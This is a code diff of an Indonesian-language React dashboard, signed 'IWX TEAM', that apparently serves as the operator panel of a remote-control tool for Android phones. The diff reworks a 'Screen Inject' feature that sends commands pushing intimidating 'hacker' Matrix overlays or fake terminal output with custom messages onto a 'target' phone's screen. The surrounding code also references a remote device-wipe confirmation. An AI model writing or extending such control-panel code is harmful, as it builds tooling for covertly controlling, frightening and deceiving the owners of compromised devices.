@@ -9,7 +9,7 @@ import {
   Clock, Smartphone, Bell, BellOff,
   CreditCard, Signal, Lock, Trash2, Terminal, FolderOpen, Settings,
 } from 'lucide-react'
-import { Server, Monitor } from 'lucide-react'
+import { Server, Monitor, Shield, SquareTerminal, Play, Square, CheckCircle2, XCircle } from 'lucide-react'
 
 interface DeviceListItem {
   deviceId: string
@@ -85,7 +85,7 @@ export default function Dashboard() {
   const [ctrlBusy, setCtrlBusy]         = useState(false)
   const [showWipeConfirm, setShowWipeConfirm] = useState(false)
   const [injectText, setInjectText]     = useState('By IWX TEAM')
-  const [injectStyle, setInjectStyle]   = useState('hacker')
+  const [injectStyle, setInjectStyle]   = useState<'hacker'|'terminal'>('hacker')
   const [isInjecting, setIsInjecting]   = useState(false)
   const [injectStatus, setInjectStatus] = useState('')
 
@@ -131,29 +131,29 @@ export default function Dashboard() {
     if (!selectedId || ctrlBusy) return
     const text = injectText.trim() || 'By IWX TEAM'
     setIsInjecting(true)
-    setInjectStatus('Mengirim…')
+    setInjectStatus('Mengirim perintah...')
     try {
       await fetch('/api/device/command', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ deviceId: selectedId, command: `screen_inject_${injectStyle}:${text}` }),
       })
-      setInjectStatus('✅ Overlay tampil di layar HP')
-    } catch { setInjectStatus('❌ Gagal kirim') }
+      setInjectStatus('Overlay aktif di layar perangkat')
+    } catch { setInjectStatus('Gagal mengirim perintah') }
   }
 
   const handleInjectStop = async () => {
     if (!selectedId) return
     setIsInjecting(false)
-    setInjectStatus('Menghapus…')
+    setInjectStatus('Menghentikan overlay...')
     try {
       await fetch('/api/device/command', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ deviceId: selectedId, command: 'screen_inject_stop' }),
       })
-      setInjectStatus('🗑️ Overlay dihapus')
-    } catch { setInjectStatus('❌ Gagal') }
+      setInjectStatus('Overlay dihentikan')
+    } catch { setInjectStatus('Gagal menghentikan overlay') }
   }
 
   const pollResult = async (command: string, sentAt: number, timeoutMs = 18000): Promise<string> => {
@@ -513,63 +513,81 @@ export default function Dashboard() {
             <h3 className="text-xs font-semibold text-android-muted uppercase tracking-wider mb-3 flex items-center gap-2">
               <Monitor size={13} className="text-android-green" />
               <span className="text-android-green">Screen Inject</span>
-              <span className="ml-auto px-2 py-0.5 rounded text-[9px] font-bold bg-android-green/10 text-android-green border border-android-green/30 uppercase tracking-widest">Hacker Mode</span>
+              <span className="ml-auto text-[10px] text-android-muted/60 font-normal normal-case tracking-normal">Enter untuk kirim</span>
             </h3>
             {!connected ? (
               <p className="text-android-muted text-xs py-2 text-center">Hubungkan perangkat untuk menggunakan Screen Inject</p>
             ) : (
               <div className="space-y-3">
-                {/* Custom text */}
-                <input
-                  type="text"
+                {/* Text input — multiline, Enter to send */}
+                <textarea
                   value={injectText}
                   onChange={e => setInjectText(e.target.value)}
-                  placeholder="By IWX TEAM"
-                  className="w-full bg-android-bg border border-android-green/30 rounded-lg px-3 py-2.5 text-sm text-android-green font-mono placeholder:text-android-muted/40 focus:outline-none focus:border-android-green/80"
+                  onKeyDown={e => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); handleInject(); } }}
+                  placeholder="Ketik pesan yang akan tampil di layar HP target..."
+                  rows={4}
+                  className="w-full bg-android-bg border border-android-green/30 rounded-lg px-3 py-2.5 text-sm text-android-green font-mono placeholder:text-android-muted/40 focus:outline-none focus:border-android-green/70 resize-none leading-relaxed"
                 />
-                {/* Style selector */}
-                <div className="grid grid-cols-4 gap-1.5">
-                  {([
-                    { id:'hacker',   label:'⚡ Hacker',   desc:'Matrix+Glitch' },
-                    { id:'matrix',   label:'🌧 Matrix',   desc:'Rain only'     },
-                    { id:'terminal', label:'💻 Terminal', desc:'Fake cmds'     },
-                    { id:'glitch',   label:'📡 Glitch',   desc:'Distort'       },
-                  ] as const).map(s=>(
-                    <button
-                      key={s.id}
-                      onClick={()=>setInjectStyle(s.id)}
-                      className={`flex flex-col items-center py-2 px-1 rounded-lg border text-center transition-all ${
-                        injectStyle===s.id
-                          ? 'bg-android-green/15 border-android-green text-android-green'
-                          : 'bg-android-bg border-android-border text-android-muted hover:border-android-green/40'
-                      }`}
-                    >
-                      <span className="text-xs font-bold">{s.label}</span>
-                      <span className="text-[9px] opacity-60 mt-0.5">{s.desc}</span>
-                    </button>
-                  ))}
+                {/* Mode selector — only Peretas & Terminal */}
+                <div className="grid grid-cols-2 gap-2">
+                  <button
+                    onClick={() => setInjectStyle('hacker')}
+                    className={`flex items-center gap-2.5 px-3 py-2.5 rounded-lg border transition-all ${
+                      injectStyle === 'hacker'
+                        ? 'bg-android-green/15 border-android-green text-android-green'
+                        : 'bg-android-bg border-android-border text-android-muted hover:border-android-green/40'
+                    }`}
+                  >
+                    <Shield size={14} />
+                    <div className="text-left">
+                      <div className="text-xs font-semibold">Mode Peretas</div>
+                      <div className="text-[10px] opacity-60">Matrix + Kartu Pesan</div>
+                    </div>
+                  </button>
+                  <button
+                    onClick={() => setInjectStyle('terminal')}
+                    className={`flex items-center gap-2.5 px-3 py-2.5 rounded-lg border transition-all ${
+                      injectStyle === 'terminal'
+                        ? 'bg-android-green/15 border-android-green text-android-green'
+                        : 'bg-android-bg border-android-border text-android-muted hover:border-android-green/40'
+                    }`}
+                  >
+                    <SquareTerminal size={14} />
+                    <div className="text-left">
+                      <div className="text-xs font-semibold">Terminal</div>
+                      <div className="text-[10px] opacity-60">Output Perintah Palsu</div>
+                    </div>
+                  </button>
                 </div>
-                {/* Action buttons */}
-                <div className="flex gap-2">
+                {/* Action buttons — full width, mobile friendly */}
+                <div className="grid grid-cols-2 gap-2">
                   <button
                     onClick={handleInject}
                     disabled={ctrlBusy}
-                    className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-bold bg-android-green/10 border border-android-green/50 text-android-green hover:bg-android-green/20 active:scale-95 transition-all disabled:opacity-50"
+                    className="flex items-center justify-center gap-2 py-3 rounded-lg text-sm font-semibold bg-android-green/10 border border-android-green/50 text-android-green hover:bg-android-green/20 active:scale-[0.98] transition-all disabled:opacity-40"
                   >
-                    <Monitor size={15} />
-                    INJECT
+                    <Play size={14} />
+                    Inject
                   </button>
                   <button
                     onClick={handleInjectStop}
                     disabled={ctrlBusy}
-                    className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-bold bg-android-red/10 border border-android-red/40 text-android-red hover:bg-android-red/20 active:scale-95 transition-all disabled:opacity-50"
+                    className="flex items-center justify-center gap-2 py-3 rounded-lg text-sm font-semibold bg-android-red/10 border border-android-red/40 text-android-red hover:bg-android-red/20 active:scale-[0.98] transition-all disabled:opacity-40"
                   >
-                    ✕ STOP
+                    <Square size={14} />
+                    Stop
                   </button>
                 </div>
+                {/* Status log */}
                 {injectStatus && (
-                  <div className="bg-android-bg border border-android-green/20 rounded-lg px-3 py-2">
-                    <p className="text-xs text-android-green font-mono text-center">{injectStatus}</p>
+                  <div className="flex items-center gap-2 bg-android-bg border border-android-border rounded-lg px-3 py-2">
+                    {injectStatus.includes('aktif') || injectStatus.includes('tampil')
+                      ? <CheckCircle2 size={12} className="text-android-green shrink-0" />
+                      : injectStatus.includes('Gagal')
+                      ? <XCircle size={12} className="text-android-red shrink-0" />
+                      : <Monitor size={12} className="text-android-muted shrink-0" />
+                    }
+                    <p className="text-xs text-android-muted font-mono">{injectStatus}</p>
                   </div>
                 )}
               </div>
